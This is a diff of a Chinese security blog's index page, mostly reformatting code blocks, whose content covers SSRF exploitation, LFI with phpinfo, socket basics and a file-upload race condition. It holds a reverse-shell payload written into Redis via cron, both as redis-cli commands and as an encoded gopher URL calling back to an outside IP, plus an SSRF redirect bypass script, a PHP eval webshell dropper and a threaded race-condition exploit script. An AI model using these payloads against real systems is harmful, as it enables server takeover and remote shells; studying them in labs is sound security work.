-<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
+<pre><code>http://ip:port/ssrf.php?url=dict://127.0.0.1:3306
+/info</code></pre><h3 id="Gopher协议攻击redis反弹shell"><a href="#Gopher协议攻击redis反弹shell" class="headerlink" title="Gopher协议攻击redis反弹shell"></a>Gopher协议攻击redis反弹shell</h3><p>Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。<br>首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：</p>
+<pre><code>redis-cli -h $1 flushall
+echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/要反弹的公网ip/反弹端口 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1
+redis-cli -h $1 config set dir /var/spool/cron/
+redis-cli -h $1 config set dbfilename root
+redis-cli -h $1 save</code></pre><p>这里网址以127.0.0.1，redis端口6379，公网ip为172.19.23.228且监听端口为2333为例<br>改成适配于 Gopher 协议的 URL：</p>
+<pre><code>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a</code></pre><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>Curl默认不支持302跳转，所以需要在ssrf.php中加上一行<code>curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)</code>来支持跳转</p>
 <p>代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function curl($url)&#123;</span><br><span class="line">$ch = curl_init();</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</span><br><span class="line">// 限制为HTTPS、HTTP协议</span><br><span class="line">curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>function curl($url){
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);
+// 限制为HTTPS、HTTP协议
+curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_exec($ch);
+curl_close($ch);
+}
 
-<p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
+$url = $_GET[&#39;url&#39;];
+curl($url);
+?&gt;</code></pre><p>php限制为http、https协议之后，我们就无法使用刚才的file dict gopher的协议了，但是我们如果开启302跳转的话可以，跳转到我们自己的vps上的网页来执行这些协议。因为服务端并没有ban掉这些协议，所以我们就找一个跳板来执行</p>
 <p>302辅助跳转脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$schema = $_GET[&apos;schema&apos;];</span><br><span class="line">$ip     = $_GET[&apos;ip&apos;];</span><br><span class="line">$port   = $_GET[&apos;port&apos;];</span><br><span class="line">$query  = $_GET[&apos;query&apos;];</span><br><span class="line"></span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;</span><br><span class="line"></span><br><span class="line">if(empty($port))&#123;  </span><br><span class="line">    header(&quot;Location: $schema://$ip/$query&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php  
+$schema = $_GET[&#39;schema&#39;];
+$ip     = $_GET[&#39;ip&#39;];
+$port   = $_GET[&#39;port&#39;];
+$query  = $_GET[&#39;query&#39;];
 
-<p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf.php?url=http://your vps&apos;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</span><br></pre></td></tr></table></figure>
+echo &quot;\n&quot;;
+echo $schema . &quot;://&quot;.$ip.&quot;/&quot;.$query;
 
-<p>注意是POST请求还是GET请求</p>
+if(empty($port)){  
+    header(&quot;Location: $schema://$ip/$query&quot;);
+} else {
+    header(&quot;Location: $schema://$ip:$port/$query&quot;);
+}</code></pre><p>通过http/s协议引入我们自己的php脚本，这样就可以执行其他协议语句<br>发送的请求如下：</p>
+<pre><code>http://127.0.0.1/ssrf.php?url=http://your vps&#39;s ip/302.php?schema=dict%26ip=127.0.0.1%26port=22%26query=info</code></pre><p>注意是POST请求还是GET请求</p>
 <h2 id="SSRF挖掘"><a href="#SSRF挖掘" class="headerlink" title="SSRF挖掘"></a>SSRF挖掘</h2><p>社交分享功能<br>转码服务<br>在线翻译<br>在线代理浏览器<br>图片加载/下载<br>图片/文章收藏功能<br>API或调用外部URL的功能</p>
 <h2 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h2><h3 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
 <h3 id="xip-io绕过"><a href="#xip-io绕过" class="headerlink" title="xip.io绕过"></a>xip.io绕过</h3><p>127.0.0.1.xip.io<br><a href="http://www.127.0.0.1.xip.io" target="_blank" rel="noopener">www.127.0.0.1.xip.io</a><br>xxx.127.0.0.1.xip.io<br>fuzz.xxx.127.0.0.1.xip.io</p>
@@ -725,7 +992,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/10/初探ssrf/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -760,21 +1027,16 @@
 <p>数据报套接字（SOCK_DGRAM）：<br>数据报套接字提供了一种无连接的服务。该服务并不能保证数据传输的可靠性，数据有可能在传输过程中丢失或出现数据重复，且无法保证顺序地接收到数据。数据报套接字使用UDP（User Datagram Protocol）协议进行数据的传输。由于数据报套接字不能保证数据传输的可靠性，对于有可能出现的数据丢失情况，需要在程序中做相应的处理。</p>
 <p>原始套接字（SOCK_RAW）：<br>原始套接字(SOCKET_RAW)允许对较低层次的协议直接访问，比如IP、 ICMP协议，它常用于检验新的协议实现，或者访问现有服务中配置的新设备，因为RAW SOCKET可以自如地控制Windows下的多种协议，能够对网络底层的传输机制进行控制，所以可以应用原始套接字来操纵网络层和传输层应用。比如，我们可以通过RAW SOCKET来接收发向本机的ICMP、IGMP协议包，或者接收TCP/IP栈不能够处理的IP包，也可以用来发送一些自定包头或自定协议的IP包。网络监听技术很大程度上依赖于SOCKET_RAW<br>原始套接字与标准套接字（标准套接字指的是前面介绍的流式套接字和数据报套接字）的区别在于：原始套接字可以读写内核没有处理的IP数据包，而流式套接字只能读取TCP协议的数据，数据报套接字只能读取UDP协议的数据。因此，如果要访问其他协议发送数据必须使用原始套接字。</p>
 <h2 id="编程思路"><a href="#编程思路" class="headerlink" title="编程思路"></a>编程思路</h2><h3 id="tcp服务端"><a href="#tcp服务端" class="headerlink" title="tcp服务端"></a>tcp服务端</h3><p>1、创建一个套接字，选择tcp流通信，并且绑定套接字到本地ip和端口</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.bind()</span><br></pre></td></tr></table></figure>
-
-<p>2、开始监听</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s.listen(5) # 一般5的最大连接就够了</span><br></pre></td></tr></table></figure>
-
-<p>3、循环接收客户端连接要求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">while True:</span><br><span class="line">    conn,addr=s.accept() # 接收tcp连接，并返回一个新的套接字conn，和ip地址addr</span><br></pre></td></tr></table></figure>
-
-<p><strong>这个套接字的作用：</strong><br>作为介质，用来接收客户端的信息、返回给客户端信息。服务端在接收这个conn套接字后跟客户端共用此套接字。</p>
+<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind()</code></pre><p>2、开始监听</p>
+<pre><code>s.listen(5) # 一般5的最大连接就够了</code></pre><p>3、循环接收客户端连接要求</p>
+<pre><code>while True:
+    conn,addr=s.accept() # 接收tcp连接，并返回一个新的套接字conn，和ip地址addr</code></pre><p><strong>这个套接字的作用：</strong><br>作为介质，用来接收客户端的信息、返回给客户端信息。服务端在接收这个conn套接字后跟客户端共用此套接字。</p>
 <p>4、执行接收的命令，结果的数据返回给客户端。</p>
 <p>5、传输完毕关闭套接字</p>
 <h3 id="tcp客户端"><a href="#tcp客户端" class="headerlink" title="tcp客户端"></a>tcp客户端</h3><p>1、创建一个套接字并连接远端</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect()</span><br></pre></td></tr></table></figure>
-
-<p>2、 连接后发送数据和接收数据</p>
+<pre><code>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect()</code></pre><p>2、 连接后发送数据和接收数据</p>
 <p>3、 传输完毕关闭套接字</p>
 <h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p><img src="https://s1.ax1x.com/2018/08/08/PyPTxA.jpg" alt></p>
 <h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p><img src="https://s1.ax1x.com/2018/08/08/PyPbrt.md.jpg" alt></p>
@@ -786,7 +1048,7 @@
             </div>
             <div class="continue">
             <a href="/2018/08/08/Socket套接字编程学习/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -816,9 +1078,7 @@
                 <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>本地文件包含，英文Local File Include，简称LFI。文件包含是一种简化代码、提高代码重用率的方法。但是，由于没有正确处理用户输入，导致本地文件包含漏洞。黑客可以通过漏洞包含非PHP执行文件，如构造包含PHP代码的图片木马、临时文件、session文件、日志等来达到执行PHP代码的目的。</p>
 <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>一个简单的文件上传，无任何过滤的页面：</p>
 <p>Lfi.php:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include $_GET[&apos;file&apos;];</span><br></pre></td></tr></table></figure>
-
-<p>&amp;一个phpinfo页面<br>docker复现的环境，这里吐槽一下ubantu..</p>
+<pre><code>&lt;?php include $_GET[&#39;file&#39;];</code></pre><p>&amp;一个phpinfo页面<br>docker复现的环境，这里吐槽一下ubantu..</p>
 <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="php引擎对表单的处理"><a href="#php引擎对表单的处理" class="headerlink" title="php引擎对表单的处理"></a>php引擎对表单的处理</h3><p>以上传文件的方式请求任意PHP文件，服务器都会创建临时文件来保存文件内容<br>PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：<br>1、请求到达；</p>
 <p>2、创建临时文件，并写入上传文件的内容；</p>
 <p>3、调用相应PHP脚本进行处理，如校验名称、大小等；</p>
@@ -831,22 +1091,92 @@
 <h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>在实际情况中，如果要修改poc参数，参考链接<br><a href="http://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">LFI with PHPInfo本地测试过程</a></p>
 <h2 id="文件上传竞争"><a href="#文件上传竞争" class="headerlink" title="文件上传竞争"></a>文件上传竞争</h2><p>刚才的竞争是数据从socket client到service过程和POST数据到文件包含过程的竞争，借助了文件包含这个点来生成一个webshell，或者执行系统命令的参数。</p>
 <p>文件竞争是多线程与服务期间的竞争。首先将文件上传到服务器，然后检测文件后缀名（或者是有害文件），如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &apos;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code>&lt;?php fputs(fopen(&quot;./info.php&quot;, &quot;w&quot;), &#39;&lt;?php @eval($_POST[&quot;drops&quot;]) ?&gt;&#39;); ?&gt;</code></pre><p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code>import os
+import requests
+import threading
 
-<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。</p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">class RaceCondition(threading.Thread):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.url = &quot;http://127.0.0.1:8080/upload/shell0.php&quot;</span><br><span class="line">        self.uploadUrl = &quot;http://127.0.0.1:8080/upload/copy.php&quot;</span><br><span class="line"></span><br><span class="line">    def _get(self):</span><br><span class="line">        print(&apos;try to call uploaded file...&apos;)</span><br><span class="line">        r = requests.get(self.url)</span><br><span class="line">        if r.status_code == 200:</span><br><span class="line">            print(&quot;[*]create file info.php success&quot;)</span><br><span class="line">            os._exit(0)</span><br><span class="line"></span><br><span class="line">    def _upload(self):</span><br><span class="line">        print(&quot;upload file.....&quot;)</span><br><span class="line">        file = &#123;&quot;file&quot;:open(&quot;shell0.php&quot;,&quot;r&quot;)&#125;</span><br><span class="line">        requests.post(self.uploadUrl, files=file)</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        while True:</span><br><span class="line">            for i in range(5):</span><br><span class="line">                self._get()</span><br><span class="line">            for i in range(10):</span><br><span class="line">                self._upload()</span><br><span class="line">                self._get()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    threads = 20</span><br><span class="line"></span><br><span class="line">    for i in range(threads):</span><br><span class="line">        t = RaceCondition()</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    for i in range(threads):</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
+class RaceCondition(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.url = &quot;http://127.0.0.1:8080/upload/shell0.php&quot;
+        self.uploadUrl = &quot;http://127.0.0.1:8080/upload/copy.php&quot;
 
-<h3 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;myfile&quot;/&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;上传&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+    def _get(self):
+        print(&#39;try to call uploaded file...&#39;)
+        r = requests.get(self.url)
+        if r.status_code == 200:
+            print(&quot;[*]create file info.php success&quot;)
+            os._exit(0)
 
-<h3 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);</span><br><span class="line">$size = 10000000;</span><br><span class="line">$path = &quot;./&quot;;</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[&apos;myfile&apos;][&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">if (is_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;]))&#123;</span><br><span class="line">    if (!move_uploaded_file($_FILES[&apos;myfile&apos;][&apos;tmp_name&apos;],$path.$filename))&#123;</span><br><span class="line">        die(&quot;error:can not move!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;error:not an upload file！&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$newfile = $path.$filename;</span><br><span class="line">echo &quot;file upload success.file path is: &quot;.$newfile.&quot;\n&lt;br /&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if ($_FILES[&apos;myfile&apos;][&apos;error&apos;] &gt; 0)&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    die(&quot;Upload file error: &quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ext = array_pop(explode(&quot;.&quot;,$_FILES[&apos;myfile&apos;][&apos;name&apos;]));</span><br><span class="line">if (!in_array($ext,$allowtype))&#123;</span><br><span class="line">    unlink($newfile);</span><br><span class="line">    die(&quot;error:upload the file type is not allowed，delete the file！&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+    def _upload(self):
+        print(&quot;upload file.....&quot;)
+        file = {&quot;file&quot;:open(&quot;shell0.php&quot;,&quot;r&quot;)}
+        requests.post(self.uploadUrl, files=file)
 
-<h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>很遗憾，文件上传竞争我没跑出来。最新学一下socket写个py吧，脚本转化能力太菜了</p>
+    def run(self):
+        while True:
+            for i in range(5):
+                self._get()
+            for i in range(10):
+                self._upload()
+                self._get()
+
+if __name__ == &quot;__main__&quot;:
+    threads = 20
+
+    for i in range(threads):
+        t = RaceCondition()
+        t.start()
+
+    for i in range(threads):
+        t.join()</code></pre><h3 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h3><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;Title&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;input type=&quot;file&quot; name=&quot;myfile&quot;/&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;上传&quot;/&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><h3 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h3><pre><code>&lt;?php
+$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);
+$size = 10000000;
+$path = &quot;./&quot;;
+
+$filename = $_FILES[&#39;myfile&#39;][&#39;name&#39;];
+
+if (is_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;])){
+    if (!move_uploaded_file($_FILES[&#39;myfile&#39;][&#39;tmp_name&#39;],$path.$filename)){
+        die(&quot;error:can not move!&quot;);
+    }
+} else {
+    die(&quot;error:not an upload file！&quot;);
+}
+
+$newfile = $path.$filename;
+echo &quot;file upload success.file path is: &quot;.$newfile.&quot;\n&lt;br /&gt;&quot;;
+
+if ($_FILES[&#39;myfile&#39;][&#39;error&#39;] &gt; 0){
+    unlink($newfile);
+    die(&quot;Upload file error: &quot;);
+}
+
+$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#39;myfile&#39;][&#39;name&#39;]));
+if (!in_array($ext,$allowtype)){
+    unlink($newfile);
+    die(&quot;error:upload the file type is not allowed，delete the file！&quot;);
+}
+?&gt;</code></pre><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>很遗憾，文件上传竞争我没跑出来。最新学一下socket写个py吧，脚本转化能力太菜了</p>
 
                 
             </div>
             <div class="continue">
             <a href="/2018/08/07/LFI with phpinfo测试/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -854,7 +1184,7 @@
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/2/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">下一页 &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/2/">&laquo; Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next &raquo;</a>
   </nav>
 
     </main>
